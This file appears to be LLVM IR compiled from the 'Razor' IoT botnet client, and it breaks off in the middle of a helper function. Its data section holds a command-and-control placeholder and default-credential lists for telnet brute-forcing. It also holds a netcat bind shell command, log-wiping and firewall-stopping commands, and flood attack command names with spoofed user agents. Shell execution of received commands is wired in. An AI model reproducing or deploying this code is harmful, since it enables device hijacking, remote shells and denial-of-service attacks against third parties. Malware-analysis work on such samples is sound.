; ModuleID = 'host/ir_O1/Razor.ll'
source_filename = "llvm-link"
target datalayout = "e-m:e-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.in_addr = type { i32 }
%struct.__va_list_tag = type { i32, i32, i8*, i8* }
%struct.__sigset_t = type { [16 x i64] }
%struct.timeval = type { i64, i64 }
%struct.sockaddr_in = type { i16, i16, %struct.in_addr, [8 x i8] }
%struct.sockaddr = type { i16, [14 x i8] }
%struct.iphdr = type { i8, i8, i16, i16, i16, i8, i8, i16, i32, i32 }
%struct.tcphdr = type { %union.anon.0 }
%union.anon.0 = type { %struct.anon }
%struct.anon = type { i16, i16, i32, i32, i8, i8, i16, i16, i16 }
%struct.telstate_t = type { i32, i32, i8, i8, i8, i8, i32, i16, i8* }
%struct.hostent = type { i8*, i8**, i32, i32, i8** }
%struct.state_t = type { i32, i8 }
%struct.ifreq = type { %union.anon.6, %union.anon.7 }
%union.anon.6 = type { [16 x i8] }
%union.anon.7 = type { %struct.ifmap }
%struct.ifmap = type { i64, i64, i16, i8, i8, i8 }

@infectline = local_unnamed_addr global i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str, i64 0, i64 0), align 8
@.str = private unnamed_addr constant [3 x i8] c"\0D\0A\00", align 1
@commServer = local_unnamed_addr global [1 x i8*] [i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.1, i32 0, i32 0)], align 8
@.str.1 = private unnamed_addr constant [8 x i8] c"IP:PORT\00", align 1
@uastrings = local_unnamed_addr global [36 x i8*] [i8* getelementptr inbounds ([74 x i8], [74 x i8]* @.str.2, i32 0, i32 0), i8* getelementptr inbounds ([83 x i8], [83 x i8]* @.str.3, i32 0, i32 0), i8* getelementptr inbounds ([88 x i8], [88 x i8]* @.str.4, i32 0, i32 0), i8* getelementptr inbounds ([88 x i8], [88 x i8]* @.str.5, i32 0, i32 0), i8* getelementptr inbounds ([64 x i8], [64 x i8]* @.str.6, i32 0, i32 0), i8* getelementptr inbounds ([69 x i8], [69 x i8]* @.str.7, i32 0, i32 0), i8* getelementptr inbounds ([88 x i8], [88 x i8]* @.str.8, i32 0, i32 0), i8* getelementptr inbounds ([106 x i8], [106 x i8]* @.str.9, i32 0, i32 0), i8* getelementptr inbounds ([87 x i8], [87 x i8]* @.str.10, i32 0, i32 0), i8* getelementptr inbounds ([80 x i8], [80 x i8]* @.str.11, i32 0, i32 0), i8* getelementptr inbounds ([34 x i8], [34 x i8]* @.str.12, i32 0, i32 0), i8* getelementptr inbounds ([91 x i8], [91 x i8]* @.str.13, i32 0, i32 0), i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.14, i32 0, i32 0), i8* getelementptr inbounds ([47 x i8], [47 x i8]* @.str.15, i32 0, i32 0), i8* getelementptr inbounds ([33 x i8], [33 x i8]* @.str.16, i32 0, i32 0), i8* getelementptr inbounds ([34 x i8], [34 x i8]* @.str.17, i32 0, i32 0), i8* getelementptr inbounds ([26 x i8], [26 x i8]* @.str.18, i32 0, i32 0), i8* getelementptr inbounds ([61 x i8], [61 x i8]* @.str.19, i32 0, i32 0), i8* getelementptr inbounds ([78 x i8], [78 x i8]* @.str.20, i32 0, i32 0), i8* getelementptr inbounds ([73 x i8], [73 x i8]* @.str.21, i32 0, i32 0), i8* getelementptr inbounds ([60 x i8], [60 x i8]* @.str.22, i32 0, i32 0), i8* getelementptr inbounds ([92 x i8], [92 x i8]* @.str.23, i32 0, i32 0), i8* getelementptr inbounds ([101 x i8], [101 x i8]* @.str.24, i32 0, i32 0), i8* getelementptr inbounds ([115 x i8], [115 x i8]* @.str.25, i32 0, i32 0), i8* getelementptr inbounds ([119 x i8], [119 x i8]* @.str.26, i32 0, i32 0), i8* getelementptr inbounds ([89 x i8], [89 x i8]* @.str.27, i32 0, i32 0), i8* getelementptr inbounds ([81 x i8], [81 x i8]* @.str.28, i32 0, i32 0), i8* getelementptr inbounds ([134 x i8], [134 x i8]* @.str.29, i32 0, i32 0), i8* getelementptr inbounds ([83 x i8], [83 x i8]* @.str.30, i32 0, i32 0), i8* getelementptr inbounds ([103 x i8], [103 x i8]* @.str.31, i32 0, i32 0), i8* getelementptr inbounds ([91 x i8], [91 x i8]* @.str.32, i32 0, i32 0), i8* getelementptr inbounds ([80 x i8], [80 x i8]* @.str.33, i32 0, i32 0), i8* getelementptr inbounds ([67 x i8], [67 x i8]* @.str.34, i32 0, i32 0), i8* getelementptr inbounds ([82 x i8], [82 x i8]* @.str.35, i32 0, i32 0), i8* getelementptr inbounds ([75 x i8], [75 x i8]* @.str.36, i32 0, i32 0), i8* getelementptr inbounds ([67 x i8], [67 x i8]* @.str.37, i32 0, i32 0)], align 16
@.str.2 = private unnamed_addr constant [74 x i8] c"Mozilla/5.0 (Windows NT 10.0; WOW64; rv:48.0) Gecko/20100101 Firefox/48.0\00", align 1
@.str.3 = private unnamed_addr constant [83 x i8] c"Mozilla/5.0 (X11; U; Linux ppc; en-US; rv:1.9a8) Gecko/2007100620 GranParadiso/3.1\00", align 1
@.str.4 = private unnamed_addr constant [88 x i8] c"Mozilla/5.0 (compatible; U; ABrowse 0.6; Syllable) AppleWebKit/420+ (KHTML, like Gecko)\00", align 1
@.str.5 = private unnamed_addr constant [88 x i8] c"Mozilla/5.0 (Macintosh; U; Intel Mac OS X; en; rv:1.8.1.11) Gecko/20071128 Camino/1.5.4\00", align 1
@.str.6 = private unnamed_addr constant [64 x i8] c"Mozilla/5.0 (Windows; U; Windows NT 6.1; rv:2.2) Gecko/20110201\00", align 1
@.str.7 = private unnamed_addr constant [69 x i8] c"Mozilla/5.0 (X11; U; Linux i686; pl-PL; rv:1.9.0.6) Gecko/2009020911\00", align 1
@.str.8 = private unnamed_addr constant [88 x i8] c"Mozilla/5.0 (Windows; U; Windows NT 6.1; cs; rv:1.9.2.6) Gecko/20100628 myibrow/4alpha2\00", align 1
@.str.9 = private unnamed_addr constant [106 x i8] c"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0; MyIE2; SLCC1; .NET CLR 2.0.50727; Media Center PC 5.0)\00", align 1
@.str.10 = private unnamed_addr constant [87 x i8] c"Mozilla/5.0 (Windows; U; Win 9x 4.90; SG; rv:1.9.2.4) Gecko/20101104 Netscape/9.1.0285\00", align 1
@.str.11 = private unnamed_addr constant [80 x i8] c"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.8) Gecko/20090327 Galeon/2.0.7\00", align 1
@.str.12 = private unnamed_addr constant [34 x i8] c"Mozilla/5.0 (PLAYSTATION 3; 3.55)\00", align 1
@.str.13 = private unnamed_addr constant [91 x i8] c"Mozilla/5.0 (X11; Linux x86_64; rv:38.0) Gecko/20100101 Thunderbird/38.2.0 Lightning/4.0.2\00", align 1
@.str.14 = private unnamed_addr constant [15 x i8] c"wii libnup/1.0\00", align 1
@.str.15 = private unnamed_addr constant [47 x i8] c"Mozilla/4.0 (PSP (PlayStation Portable); 2.00)\00", align 1
@.str.16 = private unnamed_addr constant [33 x i8] c"PSP (PlayStation Portable); 2.00\00", align 1
@.str.17 = private unnamed_addr constant [34 x i8] c"Bunjalloo/0.7.6(Nintendo DS;U;en)\00", align 1
@.str.18 = private unnamed_addr constant [26 x i8] c"Doris/1.15 [en] (Symbian)\00", align 1
@.str.19 = private unnamed_addr constant [61 x i8] c"BlackBerry7520/4.0.0 Profile/MIDP-2.0 Configuration/CLDC-1.1\00", align 1
@.str.20 = private unnamed_addr constant [78 x i8] c"BlackBerry9700/5.0.0.743 Profile/MIDP-2.1 Configuration/CLDC-1.1 VendorID/100\00", align 1
@.str.21 = private unnamed_addr constant [73 x i8] c"Opera/9.80 (X11; Linux i686; Ubuntu/14.10) Presto/2.12.388 Version/12.16\00", align 1
@.str.22 = private unnamed_addr constant [60 x i8] c"Opera/9.80 (Windows NT 5.1; U;) Presto/2.7.62 Version/11.01\00", align 1
@.str.23 = private unnamed_addr constant [92 x i8] c"Mozilla/5.0 (X11; Linux x86_64; U; de; rv:1.9.1.6) Gecko/20091201 Firefox/3.5.6 Opera 10.62\00", align 1
@.str.24 = private unnamed_addr constant [101 x i8] c"Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36\00", align 1
@.str.25 = private unnamed_addr constant [115 x i8] c"Mozilla/5.0 (Linux; Android 4.4.3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.89 Mobile Safari/537.36\00", align 1
@.str.26 = private unnamed_addr constant [119 x i8] c"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/525.19 (KHTML, like Gecko) Chrome/1.0.154.39 Safari/525.19\00", align 1
@.str.27 = private unnamed_addr constant [89 x i8] c"Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.0; Trident/5.0; chromeframe/11.0.696.57)\00", align 1
@.str.28 = private unnamed_addr constant [81 x i8] c"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.2; SV1; uZardWeb/1.0; Server_JP)\00", align 1
@.str.29 = private unnamed_addr constant [134 x i8] c"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_5_7; en-us) AppleWebKit/530.17 (KHTML, like Gecko) Version/4.0 Safari/530.17 Skyfire/2.0\00", align 1
@.str.30 = private unnamed_addr constant [83 x i8] c"SonyEricssonW800i/R1BD001/SEMC-Browser/4.2 Profile/MIDP-2.0 Configuration/CLDC-1.1\00", align 1
@.str.31 = private unnamed_addr constant [103 x i8] c"Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/4.0; FDM; MSIECrawler; Media Center PC 5.0)\00", align 1
@.str.32 = private unnamed_addr constant [91 x i8] c"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.6; rv:5.0) Gecko/20110517 Firefox/5.0 Fennec/5.0\00", align 1
@.str.33 = private unnamed_addr constant [80 x i8] c"Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0; FunWebProducts)\00", align 1
@.str.34 = private unnamed_addr constant [67 x i8] c"MOT-V300/0B.09.19R MIB/2.2 Profile/MIDP-2.0 Configuration/CLDC-1.0\00", align 1
@.str.35 = private unnamed_addr constant [82 x i8] c"Mozilla/5.0 (Android; Linux armv7l; rv:9.0) Gecko/20111216 Firefox/9.0 Fennec/9.0\00", align 1
@.str.36 = private unnamed_addr constant [75 x i8] c"Mozilla/5.0 (compatible; Teleca Q7; Brew 3.1.5; U; en) 480X800 LGE VX11000\00", align 1
@.str.37 = private unnamed_addr constant [67 x i8] c"MOT-L7/08.B7.ACR MIB/2.2.1 Profile/MIDP-2.0 Configuration/CLDC-1.1\00", align 1
@mainCommSock = local_unnamed_addr global i32 0, align 4
@currentServer = local_unnamed_addr global i32 -1, align 4
@gotIP = local_unnamed_addr global i32 0, align 4
@numpids = local_unnamed_addr global i64 0, align 8
@macAddress = local_unnamed_addr global [6 x i8] zeroinitializer, align 1
@usernames = local_unnamed_addr global [19 x i8*] [i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.38, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.39, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.40, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.41, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.42, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.43, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.44, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.45, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.46, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.47, i32 0, i32 0), i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.48, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.49, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.50, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.51, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.52, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.53, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.54, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.55, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.56, i32 0, i32 0)], align 16
@.str.38 = private unnamed_addr constant [6 x i8] c"root\00\00", align 1
@.str.39 = private unnamed_addr constant [7 x i8] c"admin\00\00", align 1
@.str.40 = private unnamed_addr constant [6 x i8] c"user\00\00", align 1
@.str.41 = private unnamed_addr constant [7 x i8] c"login\00\00", align 1
@.str.42 = private unnamed_addr constant [7 x i8] c"guest\00\00", align 1
@.str.43 = private unnamed_addr constant [9 x i8] c"support\00\00", align 1
@.str.44 = private unnamed_addr constant [9 x i8] c"netgear\00\00", align 1
@.str.45 = private unnamed_addr constant [7 x i8] c"cisco\00\00", align 1
@.str.46 = private unnamed_addr constant [6 x i8] c"ubnt\00\00", align 1
@.str.47 = private unnamed_addr constant [8 x i8] c"telnet\00\00", align 1
@.str.48 = private unnamed_addr constant [15 x i8] c"Administrator\00\00", align 1
@.str.49 = private unnamed_addr constant [9 x i8] c"comcast\00\00", align 1
@.str.50 = private unnamed_addr constant [9 x i8] c"default\00\00", align 1
@.str.51 = private unnamed_addr constant [10 x i8] c"password\00\00", align 1
@.str.52 = private unnamed_addr constant [8 x i8] c"D-Link\00\00", align 1
@.str.53 = private unnamed_addr constant [9 x i8] c"manager\00\00", align 1
@.str.54 = private unnamed_addr constant [4 x i8] c"pi\00\00", align 1
@.str.55 = private unnamed_addr constant [7 x i8] c"VTech\00\00", align 1
@.str.56 = private unnamed_addr constant [9 x i8] c"vagrant\00\00", align 1
@passwords = local_unnamed_addr global [26 x i8*] [i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.38, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.39, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.40, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.41, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.42, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.43, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.44, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.45, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.46, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.47, i32 0, i32 0), i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.48, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.49, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.50, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.51, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.57, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.58, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.59, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.52, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.53, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.54, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.60, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.55, i32 0, i32 0), i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.61, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.62, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.63, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.64, i32 0, i32 0)], align 16
@.str.57 = private unnamed_addr constant [8 x i8] c"123456\00\00", align 1
@.str.58 = private unnamed_addr constant [10 x i8] c"changeme\00\00", align 1
@.str.59 = private unnamed_addr constant [6 x i8] c"1234\00\00", align 1
@.str.60 = private unnamed_addr constant [11 x i8] c"raspberry\00\00", align 1
@.str.61 = private unnamed_addr constant [15 x i8] c"vagrant\00, 123\00\00", align 1
@.str.62 = private unnamed_addr constant [7 x i8] c"12345\00\00", align 1
@.str.63 = private unnamed_addr constant [10 x i8] c"dreambox\00\00", align 1
@.str.64 = private unnamed_addr constant [6 x i8] c"test\00\00", align 1
@pids = common local_unnamed_addr global i32* null, align 8
@ourIP = common local_unnamed_addr global %struct.in_addr zeroinitializer, align 4
@scanPid = common local_unnamed_addr global i32 0, align 4
@Q = internal unnamed_addr global [4096 x i32] zeroinitializer, align 16
@rand_cmwc.i = internal unnamed_addr global i32 4095, align 4
@c = internal unnamed_addr global i32 362436, align 4
@.str.132 = private unnamed_addr constant [7 x i8] c"(null)\00", align 1
@.str.65 = private unnamed_addr constant [9 x i8] c"buf: %s\0A\00", align 1
@fdopen_pids = internal unnamed_addr global i32* null, align 8
@.str.66 = private unnamed_addr constant [8 x i8] c"/bin/sh\00", align 1
@.str.67 = private unnamed_addr constant [3 x i8] c"sh\00", align 1
@.str.68 = private unnamed_addr constant [3 x i8] c"-c\00", align 1
@hextable = internal unnamed_addr constant [256 x i64] [i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 0, i64 1, i64 2, i64 3, i64 4, i64 5, i64 6, i64 7, i64 8, i64 9, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 10, i64 11, i64 12, i64 13, i64 14, i64 15, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 10, i64 11, i64 12, i64 13, i64 14, i64 15, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1], align 16
@.str.69 = private unnamed_addr constant [14 x i8] c"/proc/cpuinfo\00", align 1
@.str.70 = private unnamed_addr constant [9 x i8] c"BOGOMIPS\00", align 1
@.str.71 = private unnamed_addr constant [5 x i8] c"PING\00", align 1
@.str.72 = private unnamed_addr constant [7 x i8] c":>%$#\00\00", align 1
@.str.73 = private unnamed_addr constant [12 x i8] c"%d.%d.%d.%d\00", align 1
@.str.74 = private unnamed_addr constant [45 x i8] c"screen -dmSL asdf nc -l -p 4000 -e /bin/bash\00", align 1
@.str.75 = private unnamed_addr constant [6 x i8] c"ogin:\00", align 1
@.str.76 = private unnamed_addr constant [9 x i8] c"assword:\00", align 1
@.str.77 = private unnamed_addr constant [38 x i8] c"[RAZOR] \1B[34mATTEMPT \1B[37m-> %s:%s:%s\00", align 1
@.str.78 = private unnamed_addr constant [9 x i8] c"ncorrect\00", align 1
@.str.79 = private unnamed_addr constant [5 x i8] c"sh\0D\0A\00", align 1
@.str.80 = private unnamed_addr constant [39 x i8] c"[RAZOR] \1B[32mEXECUTED \1B[37m-> %s:%s:%s\00", align 1
@.str.81 = private unnamed_addr constant [43 x i8] c"[RAZOR] \1B[31mUNSUCCESSFUL \1B[37m-> %s:%s:%s\00", align 1
@.str.82 = private unnamed_addr constant [64 x i8] c"%s %s HTTP/1.1\0D\0AHost: %s\0D\0AUser-Agent: %s\0D\0AConnection: close\0D\0A\0D\0A\00", align 1
@.str.83 = private unnamed_addr constant [4 x i8] c"all\00", align 1
@.str.84 = private unnamed_addr constant [2 x i8] c",\00", align 1
@.str.85 = private unnamed_addr constant [4 x i8] c"syn\00", align 1
@.str.86 = private unnamed_addr constant [4 x i8] c"rst\00", align 1
@.str.87 = private unnamed_addr constant [4 x i8] c"fin\00", align 1
@.str.88 = private unnamed_addr constant [4 x i8] c"ack\00", align 1
@.str.89 = private unnamed_addr constant [4 x i8] c"psh\00", align 1
@.str.90 = private unnamed_addr constant [6 x i8] c"PONG!\00", align 1
@.str.91 = private unnamed_addr constant [11 x i8] c"GETLOCALIP\00", align 1
@.str.92 = private unnamed_addr constant [10 x i8] c"My IP: %s\00", align 1
@.str.93 = private unnamed_addr constant [8 x i8] c"SCANNER\00", align 1
@.str.94 = private unnamed_addr constant [17 x i8] c"SCANNER ON | OFF\00", align 1
@.str.95 = private unnamed_addr constant [4 x i8] c"OFF\00", align 1
@.str.96 = private unnamed_addr constant [24 x i8] c"STOPPING TELNET SCANNER\00", align 1
@.str.97 = private unnamed_addr constant [3 x i8] c"ON\00", align 1
@.str.98 = private unnamed_addr constant [24 x i8] c"STARTING TELNET SCANNER\00", align 1
@.str.99 = private unnamed_addr constant [5 x i8] c"HOLD\00", align 1
@.str.100 = private unnamed_addr constant [5 x i8] c"JUNK\00", align 1
@.str.101 = private unnamed_addr constant [4 x i8] c"UDP\00", align 1
@.str.102 = private unnamed_addr constant [5 x i8] c"HTTP\00", align 1
@.str.103 = private unnamed_addr constant [4 x i8] c"CNC\00", align 1
@.str.104 = private unnamed_addr constant [6 x i8] c"COMBO\00", align 1
@.str.105 = private unnamed_addr constant [4 x i8] c"TCP\00", align 1
@.str.106 = private unnamed_addr constant [9 x i8] c"KILLATTK\00", align 1
@.str.107 = private unnamed_addr constant [8 x i8] c"GTFOFAG\00", align 1
@.str.108 = private unnamed_addr constant [8 x i8] c"FATCOCK\00", align 1
@.str.109 = private unnamed_addr constant [21 x i8] c"rm -rf /var/log/wtmp\00", align 1
@.str.110 = private unnamed_addr constant [14 x i8] c"rm -rf /tmp/*\00", align 1
@.str.111 = private unnamed_addr constant [11 x i8] c"history -c\00", align 1
@.str.112 = private unnamed_addr constant [23 x i8] c"rm -rf ~/.bash_history\00", align 1
@.str.113 = private unnamed_addr constant [20 x i8] c"rm -rf /bin/netstat\00", align 1
@.str.114 = private unnamed_addr constant [11 x i8] c"history -w\00", align 1
@.str.115 = private unnamed_addr constant [16 x i8] c"killall -9 perl\00", align 1
@.str.116 = private unnamed_addr constant [22 x i8] c"service iptables stop\00", align 1
@.str.117 = private unnamed_addr constant [8 x i8] c"8.8.8.8\00", align 1
@.str.118 = private unnamed_addr constant [16 x i8] c"/proc/net/route\00", align 1
@.str.119 = private unnamed_addr constant [11 x i8] c"\0900000000\09\00", align 1
@.str.120 = private unnamed_addr constant [6 x i8] c"RAZER\00", align 1
@.str.121 = private unnamed_addr constant [19 x i8] c"/usr/sbin/dropbear\00", align 1
@.str.122 = private unnamed_addr constant [10 x i8] c"BUILD %s\0A\00", align 1
@.str.123 = private unnamed_addr constant [1 x i8] zeroinitializer, align 1
@.str.124 = private unnamed_addr constant [2 x i8] c"/\00", align 1
@.str.125 = private unnamed_addr constant [9 x i8] c"BUILD %s\00", align 1
@.str.126 = private unnamed_addr constant [5 x i8] c"PONG\00", align 1
@.str.127 = private unnamed_addr constant [6 x i8] c"DUPPP\00", align 1
@.str.128 = private unnamed_addr constant [3 x i8] c"SH\00", align 1
@.str.129 = private unnamed_addr constant [8 x i8] c"%s 2>&1\00", align 1
@.str.130 = private unnamed_addr constant [2 x i8] c"r\00", align 1
@.str.131 = private unnamed_addr constant [2 x i8] c" \00", align 1

; Function Attrs: noinline norecurse nounwind uwtable
define void @init_rand(i32) local_unnamed_addr #0 {
  store i32 %0, i32* getelementptr inbounds ([4096 x i32], [4096 x i32]* @Q, i64 0, i64 0), align 16
  %2 = add i32 %0, -1640531527
  store i32 %2, i32* getelementptr inbounds ([4096 x i32], [4096 x i32]* @Q, i64 0, i64 1), align 4
  %3 = add i32 %0, 1013904242
  store i32 %3, i32* getelementptr inbounds ([4096 x i32], [4096 x i32]* @Q, i64 0, i64 2), align 8
  br label %4

; <label>:4:                                      ; preds = %17, %1
  %indvars.iv = phi i64 [ 3, %1 ], [ %indvars.iv.next.1, %17 ]
  %5 = add nsw i64 %indvars.iv, -3
  %6 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %5
  %7 = load i32, i32* %6, align 4
  %8 = add nsw i64 %indvars.iv, -2
  %9 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %8
  %10 = load i32, i32* %9, align 4
  %11 = trunc i64 %indvars.iv to i32
  %12 = xor i32 %11, -1640531527
  %13 = xor i32 %12, %7
  %14 = xor i32 %13, %10
  %15 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %indvars.iv
  store i32 %14, i32* %15, align 4
  %indvars.iv.next = add nuw nsw i64 %indvars.iv, 1
  %exitcond = icmp eq i64 %indvars.iv.next, 4096
  br i1 %exitcond, label %16, label %17

; <label>:16:                                     ; preds = %4
  ret void

; <label>:17:                                     ; preds = %4
  %18 = add nsw i64 %indvars.iv, -2
  %19 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %18
  %20 = load i32, i32* %19, align 4
  %21 = add nsw i64 %indvars.iv, -1
  %22 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %21
  %23 = load i32, i32* %22, align 4
  %24 = trunc i64 %indvars.iv.next to i32
  %25 = xor i32 %24, -1640531527
  %26 = xor i32 %25, %20
  %27 = xor i32 %26, %23
  %28 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %indvars.iv.next
  store i32 %27, i32* %28, align 4
  %indvars.iv.next.1 = add nsw i64 %indvars.iv, 2
  br label %4
}

; Function Attrs: noinline norecurse nounwind uwtable
define i32 @rand_cmwc() local_unnamed_addr #0 {
  %1 = load i32, i32* @rand_cmwc.i, align 4
  %2 = add i32 %1, 1
  %3 = and i32 %2, 4095
  store i32 %3, i32* @rand_cmwc.i, align 4
  %4 = zext i32 %3 to i64
  %5 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %4
  %6 = load i32, i32* %5, align 4
  %7 = zext i32 %6 to i64
  %8 = mul nuw nsw i64 %7, 18782
  %9 = load i32, i32* @c, align 4
  %10 = zext i32 %9 to i64
  %11 = add nuw nsw i64 %8, %10
  %12 = lshr i64 %11, 32
  %13 = trunc i64 %12 to i32
  %14 = add nuw nsw i64 %12, %11
  %15 = trunc i64 %14 to i32
  %16 = icmp ult i32 %15, %13
  %17 = zext i1 %16 to i32
  %storemerge = add nuw nsw i32 %17, %13
  store i32 %storemerge, i32* @c, align 4
  %.neg7 = sext i1 %16 to i32
  %.0.neg = sub i32 -2, %15
  %18 = add i32 %.0.neg, %.neg7
  %19 = load i32, i32* @rand_cmwc.i, align 4
  %20 = zext i32 %19 to i64
  %21 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %20
  store i32 %18, i32* %21, align 4
  ret i32 %18
}

; Function Attrs: noinline nounwind uwtable
define void @trim(i8* nocapture) local_unnamed_addr #1 {
  %2 = tail call i64 @strlen(i8* %0) #15
  %3 = add i64 %2, 4294967295
  br label %4

